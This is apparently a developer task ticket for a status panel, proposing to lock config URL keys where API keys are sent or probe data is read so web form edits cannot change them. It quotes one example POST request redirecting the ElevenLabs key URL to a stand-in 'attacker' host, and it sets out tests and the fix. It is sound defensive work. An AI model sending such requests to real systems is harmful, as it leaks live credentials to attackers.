# t1255 — panel rules screen refuses secret-destination URL keys

## Problem / goal

t1248 closed the «one authenticated form post must not move where tokens come from»
class for *file-path* keys (telegram.env, probes.auth.credentials, …) but left the URL
keys secrets are *sent to* editable. Verified against the live config and modules:

- `usage.elevenlabs.api_url` — `status/tools/voice_api.py:60` sends the `xi-api-key`
  header (the live ElevenLabs key) to this URL;
- `usage.deepgram.api_url` — voice_api.py:101 sends `Authorization: Token <key>` there;
- `probes.alarm.url`, `probes.loe.url` — an edited URL makes the air-alarm and power
  probes present attacker-controlled JSON as real safety data.

One POST /rules with `key=usage.elevenlabs.api_url&value=http://attacker/` passes
`_edit_refusal()` and `editable()`, lands in config.local.json, and the next /usage run
delivers the live key to an attacker-chosen host.

(`probes.mail.imap_host` exists in config but mail.py hardcodes the host, so no failure
is constructible there — deliberately out of scope.)

## Test cases

- **TC1 —** `set_setting` on each of the four keys refuses with the «термінала» wording
  (regression: all four are written before the fix).
- **TC2 —** ordinary scalars (`digest.news_memory_days`, `probes.youtube.per_run`)
  remain editable — the new prefixes must not over-match.

## Approach

Add the four keys to `NO_EDIT_PREFIXES` beside the t1248 path keys, with the reason in
the existing comment; extend the t1248 test list. Nothing else changes.
